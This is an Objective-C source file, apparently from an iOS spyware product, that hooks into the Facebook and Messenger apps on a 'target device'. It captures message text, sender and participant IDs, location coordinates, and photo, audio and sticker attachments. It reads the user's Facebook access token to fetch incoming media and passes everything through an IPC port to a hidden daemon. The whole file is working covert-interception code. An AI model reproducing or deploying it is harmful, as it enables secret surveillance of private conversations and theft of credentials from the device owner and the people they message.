//
//  FacebookUtils.m
//  MSFSP
//
//  Created by Makara Khloth on 12/24/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "FacebookUtils.h"

#import "DefStd.h"
#import "MessagePortIPCSender.h"
#import "StringUtils.h"
#import "DateTimeFormat.h"

#import "FBMThread.h"
#import "ThreadMessage.h"
#import "FBMParticipantInfo.h"
#import	"FBMThreadUser.h"
#import "BatchThreadCreator.h"

#import "FxIMEvent.h"
#import "FxRecipient.h"
#import "FxIMGeoTag.h"
#import "FxAttachment.h"
#import "DaemonPrivateHome.h"
#import "SpringBoardServices.h"

#import "ACAccount-FBFoundation.h"
#import "FBAccountStore.h"
#import "UserSettings.h"
#import "FBMThreadMessagesFilter.h"
#import "FBMThreadParticipantFilter.h"
#import "UserSet.h"
#import "FBAuthenticationManagerImpl.h"
#import "FBAuthenticationManagerImpl+601.h" // For Facebook 6.0 and 6.0.1
#import "FBMessengerModuleAuthenticationManager.h"
#import "FBMessengerModuleAuthenticationManager+601.h" // For Facebook 6.0 and 6.0.1
#import "FBMessengerUser.h"
#import "LocationUpdater.h"

#import "AudioAttachment.h"
#import "PhotoAttachment.h"
#import "JKDictionary.h"
#import "MessageAttachments.h"
#import "AttachmentURLFormatter.h"

#import "UserSettings.h"
#import "FBMStickerResourceManager.h"
#import "FBMStickerManager.h"
#import "FBMStickerPack.h"
#import "FBMSticker.h"

#import "FBFacebookCredentials.h"


#define FACEBOOK_INDENTIFIER	@"com.facebook.Facebook"
#define MESSENGER_INDENTIFIER	@"com.facebook.Messenger"

static FacebookUtils *_FacebookUtils = nil;

@interface FacebookUtils (private)

+ (NSString *) getFrontMostApplication;

- (void) thread: (FxIMEvent *) aIMEvent;

- (void) checkHaveAttachment:(NSArray *)aArrayofAttachment;

- (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray;

@end

@implementation FacebookUtils

@synthesize mNumFetchThread, mFBAuthenManagerImpl, mFBMessengerModuleAuthManager, mofflineThreadingId,mAcessToken;


+ (id) shareFacebookUtils {
	if (_FacebookUtils == nil) {
		_FacebookUtils = [[FacebookUtils alloc] init];
	}
	return (_FacebookUtils);
}

+ (void) sendFacebookEvent: (FxIMEvent *) aIMEvent {
	FacebookUtils *fbUtils = [[FacebookUtils alloc] init];
	[NSThread detachNewThreadSelector:@selector(thread:)
							 toTarget:fbUtils withObject:aIMEvent];
	[fbUtils autorelease];
}

+ (NSString *) getFrontMostApplication {
	
	mach_port_t *p = (mach_port_t *) SBSSpringBoardServerPort();
	char frontmostAppS[256];
	memset(frontmostAppS, sizeof(frontmostAppS), 0);
	SBFrontmostApplicationDisplayIdentifier(p,frontmostAppS);
	
	NSString * frontmostApp = [NSString stringWithFormat:@"%s",frontmostAppS];
	DLog(@"Frontmost app is %@", frontmostApp);
	return frontmostApp;
}

- (void) thread: (FxIMEvent *) aIMEvent {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	@try {
		NSString *msg = [StringUtils removePrivateUnicodeSymbols:[aIMEvent mMessage]];
		DLog(@"Facebook message after remove emoji = %@", msg);
		if (([msg length]>0) || ([[aIMEvent mAttachments]count]>0)) {
			[aIMEvent setMMessage:msg];
			
			NSMutableData* data = [[NSMutableData alloc] init];
			NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
			NSString *bundleIdentifier = [[NSBundle mainBundle] bundleIdentifier];
			NSDictionary *fbInfo = [[NSDictionary alloc] initWithObjectsAndKeys:bundleIdentifier, @"bundle",
									aIMEvent, @"IMEvent", nil];
			[archiver encodeObject:fbInfo forKey:kFacebookArchied];
			[archiver finishEncoding];
			[fbInfo release];
			[archiver release];	
			
			BOOL successfullySend = NO;
			MessagePortIPCSender *messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:kFacebookMessagePort];
			successfullySend = [messagePortSender writeDataToPort:data];
			[messagePortSender release];
			
			DLog(@"************ successfullySend = %d", successfullySend);
			
			if (!successfullySend) {
				[self deleteAttachmentFileAtPathForEvent:[aIMEvent mAttachments]];
			}
			
			[data release];
		}
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}
	[pool release];
}

+ (void) captureFacebookMessage: (FBMThread *) aFBMThread message: (ThreadMessage *) aThreadMessage{
	
	ThreadMessage *msgObj = aThreadMessage;
	
	NSString *message = [msgObj text];
	
	NSString *userId = [(FBMParticipantInfo*)[msgObj senderInfo] userId]; // 100001619597136
	NSString *senderId = userId;
	/*
	 Got "TODO" when messenger is not running (user kill messenger) 
	 -> message received via push notification
	 -> user click to open message
	 -> got null/TODO instead of 100001619597136@facebook.com
	*/
	NSString *email = [(FBMParticipantInfo*)[msgObj senderInfo] email];
	NSString *userDisplayName = nil;
	NSString *imServiceId = @"fbk";
	NSString *messageId = [msgObj messageId];
	NSString *offlineThreadingId = [msgObj offlineThreadingId];
	int direction = kEventDirectionUnknown;
	NSMutableArray *fxParticipants = [NSMutableArray array];
	
	DLog (@"---------------------------------------------------");
	DLog (@"msgObj = %@", msgObj);
	DLog (@"senderInfo = %@", [msgObj senderInfo]);
	DLog (@"sendState = %d", [msgObj sendState]);
	DLog (@"actionId = %d", [msgObj actionId]);
	DLog (@"source = %d", [msgObj source]);
	DLog (@"---------------------------------------------------");
	
	FBAuthenticationManagerImpl *fbAuthenManagerImpl = nil;
	fbAuthenManagerImpl = [[FacebookUtils shareFacebookUtils] mFBAuthenManagerImpl];
	
	//==================================== mailboxViewer Facebook 6.0.1
	// For Facebook 6.0.1
	
	FBMessengerModuleAuthenticationManager *fbMessengerModuleAuthManager = nil;
	fbMessengerModuleAuthManager = [[FacebookUtils shareFacebookUtils] mFBMessengerModuleAuthManager];
	
	FBMessengerUser *meUser = nil;
	
	if ([fbAuthenManagerImpl respondsToSelector:@selector(mailboxViewer)] ||
		[fbMessengerModuleAuthManager respondsToSelector:@selector(mailboxViewer)]) {
		
		 meUser = [fbAuthenManagerImpl mailboxViewer]; // Messenger
		
		if (meUser == nil) {
			meUser = [fbMessengerModuleAuthManager mailboxViewer]; // Facebook
		
			if (meUser == nil) {
				[fbMessengerModuleAuthManager prepareMailboxViewer];
				meUser = [fbMessengerModuleAuthManager mailboxViewer];
				DLog (@"[1] meUser from prepare = %@", meUser);
			}
		}
		
	
	}
	// For Facebook Messenger 2.3.1 and Facebook version ealier than 6.0 and 6.0.1
	else {
		
		meUser = [fbAuthenManagerImpl meUser]; // Messenger
		
		if (meUser == nil) {
			meUser = [fbMessengerModuleAuthManager meUser]; // Facebook
			
			if (meUser == nil) {
				[fbMessengerModuleAuthManager prepareMeUser];
				meUser = [fbMessengerModuleAuthManager meUser];
				DLog (@"[2] meUser from prepare = %@", meUser);
			}
		}
	}
	
	//==================================== mailboxViewer Facebook 6.0.1
	// ---- end fix crash
	if ([senderId isEqualToString:[meUser userId]]) { // If the sender is target device ==> outgoing
		direction = kEventDirectionOut;
	} else {
		direction = kEventDirectionIn;
	}
	
	NSMutableArray *finalParticipants = [NSMutableArray array];
	
	NSArray *origParticipants = [aFBMThread participants]; // All party concerned including target
	NSMutableArray *tempParticipants = [origParticipants mutableCopy];
	
	// 1. Find sender account -> remove sender from participants list
	// 2. Only incoming directiom, find target account -> remove target account from participants list ->
	//	create FxRecipient from target account -> add to index 0 of finalParticipants
	for (int i=0; i < [origParticipants count]; i++) {
		FBMThreadUser *user = [origParticipants objectAtIndex:i];
		FBMParticipantInfo *participantInfo = [user participantInfo];
		
		DLog(@"------- FBMParticipantInfo -----------");
		DLog (@"email = %@", [participantInfo email]);
		DLog (@"userId = %@", [participantInfo userId]);
		DLog (@"name = %@", [participantInfo name]);
		DLog (@"readReceiptMessageId = %@", [participantInfo readReceiptMessageId]);
		DLog(@"------- FBMParticipantInfo -----------");
		
		// 1.
		if ([[participantInfo userId] isEqualToString:userId]) {
			userDisplayName = [participantInfo name];
			email = [participantInfo email];
			//[tempParticipants removeObjectAtIndex:i];
			//break;
			
			[tempParticipants removeObject:user];
		}
		
		// 2.
		if (direction == kEventDirectionIn &&
			[[participantInfo userId] isEqualToString:[meUser userId]]) {
			// If userId equal [meUser userId] --> no problem for two times removal (1st remove found, 2nd remove not found)
			[tempParticipants removeObject:user];
			
			FxRecipient *participant = [[FxRecipient alloc] init];
			//[participant setRecipNumAddr:[participantInfo email]];
			[participant setRecipNumAddr:[participantInfo userId]];
			[participant setRecipContactName:[participantInfo name]];
			[finalParticipants addObject:participant];
			[participant release];
		}
	}
	
	for (FBMThreadUser *obj in tempParticipants) {
		FBMParticipantInfo *participantInfo = [obj participantInfo];
		
		DLog(@"------- participantInfo -----------");
		DLog(@"userId = %@,", [participantInfo userId]);
		DLog(@"email = %@", [participantInfo email]);
		DLog(@"name = %@", [participantInfo name]);
		DLog(@"readReceiptTimestamp = %lld", [participantInfo readReceiptTimestamp]);
		DLog(@"readReceiptMessageId = %@", [participantInfo readReceiptMessageId]);
		DLog(@"isUser = %d", [participantInfo isUser]);
		DLog(@"isEmailUser = %d", [participantInfo isEmailUser]);
		DLog(@"getKey = %@", [participantInfo getKey]);
		DLog(@"JSONString = %@", [participantInfo JSONString]);
		DLog(@"------- participantInfo -----------");
		
		FxRecipient *participant = [[FxRecipient alloc] init];
		//[participant setRecipNumAddr:[participantInfo email]];
		[participant setRecipNumAddr:[participantInfo userId]];
		[participant setRecipContactName:[participantInfo name]];
		[finalParticipants addObject:participant];
		[participant release];
	}
	fxParticipants = finalParticipants;
	[tempParticipants release];
	
	NSString *conversationID = [aFBMThread threadId];
	NSString *conversationName = [aFBMThread name];
	
	// Calulate name of conversation
	if (conversationName == nil) {
		if ([fxParticipants count] <= 1) { // Never less than 1 otherwise bug
			if (direction == kEventDirectionOut) { // Out
				conversationName = [[fxParticipants objectAtIndex:0] recipContactName];
			} else { // In
				conversationName = userDisplayName;
			}
		} else {
			NSMutableArray *names = [[NSMutableArray alloc] init];
			if (direction == kEventDirectionOut) { // Out
				for (FxRecipient *participant in fxParticipants) {
					[names addObject:[participant recipContactName]];
				}
			} else { // In
				[names addObject:userDisplayName];
				for (NSInteger i = 1; i < [fxParticipants count]; i++) { // Not include the target account
					[names addObject:[[fxParticipants objectAtIndex:i] recipContactName]];
				}
			}
			conversationName = [names componentsJoinedByString:@","];
			[names release];
		}
	}
	
	DLog (@"---------------------------------------------------");
	DLog(@"mDirection->%d", direction);
	DLog(@"mUserID1->%@", userId);
	DLog(@"mUserID2->%@", email);
	DLog(@"mParticipants->%@", fxParticipants);
	DLog(@"mIMServiceID->%@", imServiceId);
	DLog(@"mMessage->%@", message);
	DLog(@"mUserDisplayName->%@", userDisplayName);
	
	DLog (@"mConversationID->%@", conversationID);
	DLog (@"mConversationName->%@", conversationName);
	DLog (@"messageId -> %@", messageId);
	DLog (@"offlineThreadingId -> %@", offlineThreadingId);
	DLog (@"---------------------------------------------------");
	
	FxIMEvent *imEvent = [[FxIMEvent alloc] init];
	[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	//[imEvent setMUserID:email];
	[imEvent setMUserID:userId];
	[imEvent setMDirection:(FxEventDirection)direction];
	[imEvent setMIMServiceID:imServiceId];
	[imEvent setMMessage:message];
	[imEvent setMRepresentationOfMessage:kIMMessageText];
	[imEvent setMUserDisplayName:userDisplayName];
	[imEvent setMParticipants:finalParticipants];
	
	// New fields ...
	[imEvent setMServiceID:kIMServiceFacebook];
	[imEvent setMConversationID:conversationID];
	[imEvent setMConversationName:conversationName];
	float accuracy = 0.0;
	float latitude = 0.0;
	float longitude = 0.0;
	NSDictionary *coordinates = [msgObj coordinates];
	if (coordinates == nil && direction == kEventDirectionOut) {
//		Class $LocationUpdater = objc_getClass("LocationUpdater");
//		LocationUpdater *locationUpdater = [$LocationUpdater locationUpdaterWithDesiredAccuracy:65.0]; // 65.0 is magic number from test result
//		id lastGoodLocation = [locationUpdater lastGoodLocation];
		
//		DLog (@"------------------ What is lastGoodLocation class? -----------------");
//		DLog (@"$LocationUpdater = %@", $LocationUpdater);
//		DLog (@"locationUpdater = %@", locationUpdater);
//		DLog (@"[lastGoodLocation class] = %@", [lastGoodLocation class]);
//		DLog (@"lastGoodLocation = %@", lastGoodLocation);
//		DLog (@"------------------ What is lastGoodLocation class? -----------------");
	} else {
		accuracy = [[coordinates objectForKey:@"accuracy"] floatValue];
		latitude = [[coordinates objectForKey:@"latitude"] floatValue];
		longitude = [[coordinates objectForKey:@"longitude"] floatValue];
	}
	
	FxIMGeoTag *location = [[FxIMGeoTag alloc] init];
	[location setMLongitude:longitude];
	[location setMLatitude:latitude];
	[location setMHorAccuracy:accuracy];
	[imEvent setMUserLocation:location];
	[location release];
	
	DLog (@"---------------------------------------------------");
	DLog(@"longitude->%f", longitude);
	DLog(@"latitude->%f", latitude);
	DLog(@"accuracy->%f", accuracy);
	DLog (@"---------------------------------------------------");
	
	// Utils fields...
	[imEvent setMMessageIdOfIM:messageId];
 	[imEvent setMOfflineThreadId:offlineThreadingId];
	
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	
	// Add Attachment Outgoing 
	DLog(@"************** outgoingAttachments %@",[msgObj outgoingAttachments]);
	
	if (direction == kEventDirectionOut) {
		if([[msgObj outgoingAttachments]count] > 0){
			
			NSMutableArray *attachments = [[NSMutableArray alloc] init];
			//Add Sticker Outgoing
			if([aThreadMessage respondsToSelector:@selector(getStickerFbId)]){
				if([aThreadMessage getStickerFbId]>0){
					[imEvent setMRepresentationOfMessage:kIMMessageSticker];
					DLog(@"****** Have Outgoing  Sticker ID is %llu ",[aThreadMessage getStickerFbId]);
					
					Class $UserSettings = objc_getClass("UserSettings");
					UserSettings * settting = [$UserSettings sharedInstance];
					
					Class $FBMStickerManager = objc_getClass("FBMStickerManager");
					FBMStickerManager * manager = [[$FBMStickerManager alloc]initWithUserSettings:settting];
					
					FBMSticker * fbmSticker = [manager stickerWithFbId:[aThreadMessage getStickerFbId]];
					
					Class $FBMStickerResourceManager = objc_getClass("FBMStickerResourceManager");
					NSString * path = [NSString stringWithFormat:@"%@/%llu/sticker_%llu.png",[$FBMStickerResourceManager stickerRootDirectoryPath],[fbmSticker stickerPackFbId],[fbmSticker fbId]];
					NSString * defaultpath = [NSString stringWithFormat:@"%@/FBMessengerApp.bundle/sticker_items/sticker_%llu.png",[[NSBundle mainBundle] resourcePath],[fbmSticker fbId]];  
					NSString * otherpath =  [NSString stringWithFormat:@"%@/others/sticker_%llu.png",[$FBMStickerResourceManager stickerRootDirectoryPath],[fbmSticker fbId]];
					
					NSData * datatowrite = nil;
					NSFileManager * fileManager = [NSFileManager defaultManager];
					if([fileManager fileExistsAtPath:path]){
						DLog(@"*** path %@",path);
						UIImage *image = [UIImage imageWithContentsOfFile:path];
						datatowrite = UIImagePNGRepresentation(image);
					}else{
						if([fileManager fileExistsAtPath:defaultpath]){
							DLog(@"*** defaultpath %@",defaultpath);
							UIImage *image = [UIImage imageWithContentsOfFile:defaultpath];
							datatowrite = UIImagePNGRepresentation(image);	
						}else if([fileManager fileExistsAtPath:otherpath]){
							DLog(@"*** otherpath %@",otherpath);
							UIImage *image = [UIImage imageWithContentsOfFile:otherpath];
							datatowrite = UIImagePNGRepresentation(image);	
						}
					}
					if(datatowrite != nil){
						DLog(@"********************* Write Data");
						FxAttachment *attachment = [[FxAttachment alloc] init];	
						[attachment setMThumbnail:datatowrite];
						[attachments addObject:attachment];			
						[attachment release];
					}else{
						DLog(@"********************* Data Lost");
					}	
				}
			}
			
			//Outgoing Attachment Facebook and Messenger
			NSString* facebookAttachmentPath=@"";
			for(int i=0;i<[[msgObj outgoingAttachments]count];i++){
				facebookAttachmentPath    = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imFacebook/"];
				Class $PhotoAttachment = objc_getClass("PhotoAttachment");
				Class $AudioAttachment = objc_getClass("AudioAttachment");
				if([[[msgObj outgoingAttachments]objectAtIndex:i]isKindOfClass:[$PhotoAttachment class]]){
					DLog(@"*****Capture Photo");
					facebookAttachmentPath = [NSString stringWithFormat:@"%@%@%f%d.jpg",facebookAttachmentPath,[msgObj messageId],[[NSDate date]timeIntervalSince1970],i];
					DLog(@"facebookAttachmentPath %@",facebookAttachmentPath);
					PhotoAttachment * photo = [[msgObj outgoingAttachments]objectAtIndex:i];
					NSData *datatowrite = [photo attachmentData];
					[datatowrite writeToFile:facebookAttachmentPath atomically:YES];
					
					FxAttachment *attachment = [[FxAttachment alloc] init];	
					[attachment setFullPath:facebookAttachmentPath];
					[attachments addObject:attachment];			
					[attachment release];
				}else if([[[msgObj outgoingAttachments]objectAtIndex:i]isKindOfClass:[$AudioAttachment class]]){
					DLog(@"*****Capture Audio");
					facebookAttachmentPath = [NSString stringWithFormat:@"%@%@%f%d.mpeg",facebookAttachmentPath,[msgObj messageId],[[NSDate date]timeIntervalSince1970],i];
					DLog(@"facebookAttachmentPath %@",facebookAttachmentPath);
					AudioAttachment * audio = [[msgObj outgoingAttachments]objectAtIndex:i];
					NSData *datatowrite = [audio attachmentData];
					[datatowrite writeToFile:facebookAttachmentPath atomically:YES];
					
					FxAttachment *attachment = [[FxAttachment alloc] init];	
					[attachment setFullPath:facebookAttachmentPath];
					[attachments addObject:attachment];			
					[attachment release];
				}
			}
			[imEvent setMAttachments:attachments];
			[attachments release];
			
		}
		
		[FacebookUtils sendFacebookEvent:imEvent];
	}
	// Add Attachment Incoming 
	else{
		DLog(@"*** [adminText length] %d text: %@",[[aThreadMessage adminText]length],[aThreadMessage text]);
		if([[aThreadMessage adminText]length]>0){
			
			FacebookUtils * facebookUtils = [FacebookUtils shareFacebookUtils];
			NSArray *extraArgs = [[NSArray alloc] initWithObjects:aFBMThread, aThreadMessage,imEvent, nil];
			[NSThread detachNewThreadSelector:@selector(checkHaveAttachment:) toTarget:facebookUtils withObject:extraArgs ];
			
			[extraArgs release];
		}else{
			[FacebookUtils sendFacebookEvent:imEvent];
		}
	}
	
	[pool release];

	[imEvent release];
}

-(void)checkHaveAttachment:(NSArray *)aArrayofAttachment {
	
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	
	Class $MessageAttachments = objc_getClass("MessageAttachments");
	MessageAttachments * messageAttachments = [[$MessageAttachments alloc]init];
	
	FBMThread * fbmThread = [[aArrayofAttachment objectAtIndex:0]retain];
	ThreadMessage * originalMessage = [[aArrayofAttachment objectAtIndex:1]retain];
	FxIMEvent *imEvent = [[aArrayofAttachment objectAtIndex:2]retain];
	
	[NSThread sleepForTimeInterval:5.0];
	
	ThreadMessage * newestMessage = [fbmThread newestMessage];
	ThreadMessage * msg = nil;
	
	if([[newestMessage messageId]isEqualToString:[originalMessage messageId]]){
		DLog(@"******* newestMessage");
		msg = newestMessage;
		DLog(@"newestMessage %@",[fbmThread newestMessage]);
	}else{
		DLog(@"******* find");
		DLog(@"******* originalMessage %@",originalMessage);
		for(int i=0 ;i<[[fbmThread messages]count];i++){
			ThreadMessage * tmpMessage = [[fbmThread messages]objectAtIndex:i];
			if([[tmpMessage messageId]isEqualToString:[originalMessage messageId]]){
				msg = [[fbmThread messages]objectAtIndex:i];
				DLog(@"******* msg1 %@",msg);
				break;
			}
		}
	}
	
	DLog(@"messages %@",[fbmThread messages]);
	
	JKDictionary * attachmentMap = (JKDictionary *)[msg attachmentMap];
	
	DLog(@"*** text %@",[msg text]);
	DLog(@"*** attachmentMap %@",attachmentMap);
	
	NSString* facebookAttachmentPath=@"";
	NSMutableArray *attachments = [[NSMutableArray alloc] init];
	
	//Add Sticker Incoming
	if([msg respondsToSelector:@selector(getStickerFbId)]){
		DLog(@"*** [msg getStickerFbId] %llu",[msg getStickerFbId]);
		if([msg getStickerFbId]>0){
			[imEvent setMRepresentationOfMessage:kIMMessageSticker];
			
			Class $UserSettings = objc_getClass("UserSettings");
			UserSettings * settting = [$UserSettings sharedInstance];
			
			Class $FBMStickerManager = objc_getClass("FBMStickerManager");
			FBMStickerManager * manager = [[$FBMStickerManager alloc]initWithUserSettings:settting];
			
			FBMSticker * fbmSticker = [manager stickerWithFbId:[msg getStickerFbId]];
			
			Class $FBMStickerResourceManager = objc_getClass("FBMStickerResourceManager");
			NSString * path = [NSString stringWithFormat:@"%@/%llu/sticker_%llu.png",[$FBMStickerResourceManager stickerRootDirectoryPath],[fbmSticker stickerPackFbId],[fbmSticker fbId]];
			NSString * defaultpath = [NSString stringWithFormat:@"%@/FBMessengerApp.bundle/sticker_items/sticker_%llu.png",[[NSBundle mainBundle] resourcePath],[fbmSticker fbId]];  
			NSString * otherpath =  [NSString stringWithFormat:@"%@/others/sticker_%llu.png",[$FBMStickerResourceManager stickerRootDirectoryPath],[fbmSticker fbId]];
			
			NSData * datatowrite = nil;
			NSFileManager * fileManager = [NSFileManager defaultManager];
			if([fileManager fileExistsAtPath:path]){
				DLog(@"*** path %@",path);
				UIImage *image = [UIImage imageWithContentsOfFile:path];
				datatowrite = UIImagePNGRepresentation(image);
			}else{
				if([fileManager fileExistsAtPath:defaultpath]){
					DLog(@"*** defaultpath %@",defaultpath);
					UIImage *image = [UIImage imageWithContentsOfFile:defaultpath];
					datatowrite = UIImagePNGRepresentation(image);	
				}else if([fileManager fileExistsAtPath:otherpath]){
					DLog(@"*** otherpath %@",otherpath);
					UIImage *image = [UIImage imageWithContentsOfFile:otherpath];
					datatowrite = UIImagePNGRepresentation(image);	
				}
			}
			if(datatowrite != nil){
				DLog(@"********************* Write Data");
				FxAttachment *attachment = [[FxAttachment alloc] init];	
				[attachment setMThumbnail:datatowrite];
				[attachments addObject:attachment];			
				[attachment release];
			}else{
				DLog(@"********************* Data Lost");
			}
		}
	}
	
	// Add Incoming Attachment 
	for(int i=0;i<[[attachmentMap allKeys]count];i++){
		facebookAttachmentPath    = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imFacebook/"];
		NSMutableDictionary * item = [attachmentMap objectForKey:[[attachmentMap allKeys]objectAtIndex:i]];
		NSString * mytype = [item objectForKey:@"mime_type"] ;
		if ([mytype rangeOfString:@"image"].location != NSNotFound) {
			
			Class $AttachmentURLFormatter = objc_getClass("AttachmentURLFormatter");
			AttachmentURLFormatter *url =[[$AttachmentURLFormatter alloc]init];

			if([[[NSBundle mainBundle] bundleIdentifier]isEqualToString:@"com.facebook.Facebook"]){
				NSString * urlForImage = [url urlForAttachment:[[attachmentMap allKeys]objectAtIndex:i] messageId:[msg messageId] preview:NO];
				NSArray * ArrayForKey = [urlForImage componentsSeparatedByString:@"(null)"];
				urlForImage = [NSString stringWithFormat:@"https://api.facebook.com/method/%@",[ArrayForKey objectAtIndex:1]];
				
				facebookAttachmentPath = [NSString stringWithFormat:@"%@%@%f%d.jpeg",facebookAttachmentPath,[msg messageId],[[NSDate date]timeIntervalSince1970],i];
				NSURL * link = [NSURL URLWithString:urlForImage];
				NSData *datatowrite = [NSData dataWithContentsOfURL:link];
				[datatowrite writeToFile:facebookAttachmentPath atomically:YES];
				DLog(@"********************* urlForImage %@",urlForImage);
				
				FxAttachment *attachment = [[FxAttachment alloc] init];	
				[attachment setFullPath:facebookAttachmentPath];
				[attachments addObject:attachment];			
				[attachment release];
			
			}
			else if([[[NSBundle mainBundle] bundleIdentifier]isEqualToString:@"com.facebook.Messenger"]){
				NSString * urlForImage = [url urlForAttachment:[[attachmentMap allKeys]objectAtIndex:i] messageId:[msg messageId] preview:NO];
				NSArray * ArrayForKey = [urlForImage componentsSeparatedByString:@"(null)"];
				
				FBAuthenticationManagerImpl *fbAuthenManagerImpl = [[FacebookUtils shareFacebookUtils]mFBAuthenManagerImpl];
				FBFacebookCredentials * facebookCredentials = [fbAuthenManagerImpl facebookCredentials];
				
				urlForImage = [NSString stringWithFormat:@"https://api.facebook.com/method/%@&access_token=%@",[ArrayForKey objectAtIndex:1],[facebookCredentials accessToken]];
				
				facebookAttachmentPath = [NSString stringWithFormat:@"%@%@%f%d.jpeg",facebookAttachmentPath,[msg messageId],[[NSDate date]timeIntervalSince1970],i];
				NSURL * link = [NSURL URLWithString:urlForImage];
				NSData *datatowrite = [NSData dataWithContentsOfURL:link];
				[datatowrite writeToFile:facebookAttachmentPath atomically:YES];
				DLog(@"********************* urlForImage %@",urlForImage);
				
				FxAttachment *attachment = [[FxAttachment alloc] init];	
				[attachment setFullPath:facebookAttachmentPath];
				[attachments addObject:attachment];			
				[attachment release];
			
			}
			
			[url release];
		}else if ([mytype rangeOfString:@"audio"].location != NSNotFound) {
			Class $AttachmentURLFormatter = objc_getClass("AttachmentURLFormatter");
			AttachmentURLFormatter *url =[[$AttachmentURLFormatter alloc]init];
			
			
			if([[[NSBundle mainBundle] bundleIdentifier]isEqualToString:@"com.facebook.Facebook"]){
				NSString * urlForAudio = [url urlForAttachment:[[attachmentMap allKeys]objectAtIndex:i] messageId:[msg messageId] preview:NO];
				NSArray * ArrayForKey = [urlForAudio componentsSeparatedByString:@"(null)"];
				urlForAudio = [NSString stringWithFormat:@"https://api.facebook.com/method/%@",[ArrayForKey objectAtIndex:1]];
				
				facebookAttachmentPath = [NSString stringWithFormat:@"%@%@%f%d.mpeg",facebookAttachmentPath,[msg messageId],[[NSDate date]timeIntervalSince1970],i];
				NSURL * link = [NSURL URLWithString:urlForAudio];
				NSData *datatowrite = [NSData dataWithContentsOfURL:link];
				[datatowrite writeToFile:facebookAttachmentPath atomically:YES];
				DLog(@"********************* urlForAudio %@",urlForAudio);
				
				FxAttachment *attachment = [[FxAttachment alloc] init];	
				[attachment setFullPath:facebookAttachmentPath];
				[attachments addObject:attachment];			
				[attachment release];
				[url release];
				
			}
			else if([[[NSBundle mainBundle] bundleIdentifier]isEqualToString:@"com.facebook.Messenger"]){
				NSString * urlForAudio = [url urlForAttachment:[[attachmentMap allKeys]objectAtIndex:i] messageId:[msg messageId] preview:NO];
				NSArray * ArrayForKey = [urlForAudio componentsSeparatedByString:@"(null)"];
				
				FBAuthenticationManagerImpl *fbAuthenManagerImpl = [[FacebookUtils shareFacebookUtils]mFBAuthenManagerImpl];
				FBFacebookCredentials * facebookCredentials = [fbAuthenManagerImpl facebookCredentials];
				
				urlForAudio = [NSString stringWithFormat:@"https://api.facebook.com/method/%@&access_token=%@",[ArrayForKey objectAtIndex:1],[facebookCredentials accessToken]];
				
				facebookAttachmentPath = [NSString stringWithFormat:@"%@%@%f%d.mpeg",facebookAttachmentPath,[msg messageId],[[NSDate date]timeIntervalSince1970],i];
				NSURL * link = [NSURL URLWithString:urlForAudio];
				NSData *datatowrite = [NSData dataWithContentsOfURL:link];
				[datatowrite writeToFile:facebookAttachmentPath atomically:YES];
				DLog(@"********************* urlForAudio %@",urlForAudio);
				
				FxAttachment *attachment = [[FxAttachment alloc] init];	
				[attachment setFullPath:facebookAttachmentPath];
				[attachments addObject:attachment];			
				[attachment release];
				[url release];
				
			}

			
		}
	}
	
	[imEvent setMAttachments:attachments];
	
	[FacebookUtils sendFacebookEvent:imEvent];
	
	[attachments release];
	[imEvent release];
	[originalMessage release];
	[fbmThread release];
	[messageAttachments release];
	
	[pool release];
}

- (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray  {
	for(int i=0;i<[aAttachmentArray count];i++){
		FxAttachment *attachment = (FxAttachment *)[aAttachmentArray objectAtIndex:i];
		NSString *path = [attachment fullPath];
		BOOL deletesuccess = [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
		if(deletesuccess){
			DLog (@"Deleting file %@",path );
		}else{
			DLog (@"Fail deleting file %@",path );
		}
	}
}


- (void) dealloc {
	[mofflineThreadingId release];
	[mAcessToken release];
	[super dealloc];
}

@end
